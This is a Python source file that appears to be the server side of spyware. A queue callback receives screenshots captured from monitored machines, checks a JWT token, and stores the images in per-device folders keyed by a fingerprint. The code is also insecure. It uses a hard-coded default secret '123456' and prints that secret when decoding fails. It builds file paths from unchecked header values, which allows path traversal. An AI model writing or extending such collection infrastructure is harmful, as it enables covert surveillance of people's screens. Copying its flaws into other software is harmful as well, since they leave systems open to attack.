import json, os
import jwt
from spyware_server_common.utils import createFolderIfNotExists, generate_random
from spyware_server_common.config import get_config

def create_screenshots_callback () :
    def screenshots_callback (ch, method, properties, body) :
        ch.basic_ack(delivery_tag=method.delivery_tag)

        config = get_config()
        headers = properties.headers

        if headers is None : return
        
        if 'token' not in headers or 'screenId' not in headers : return

        token = headers.get('token')
        screenId = headers.get('screenId')
        extension = headers.get('ext', 'bmp')

        try :
            tokenData = jwt.decode(token.encode(), config.get('secret', '123456'), algorithms=["HS256"])
        except Exception as ex:
            print('[ERROR]', ex.__str__())
            print(config.get('secrect', '123456'))
            return

        print('token =>', tokenData)
        if tokenData is None : return

        fp = tokenData.get('fp')

        if fp is None : return

        dirname = os.path.join('screenshots/', fp)
        createFolderIfNotExists('screenshots')
        createFolderIfNotExists(dirname)

        print('dirname =>', dirname)

        with open(os.path.join(dirname, f'{screenId}.{extension}'), 'ab') as f:
            f.write(body)

    return screenshots_callback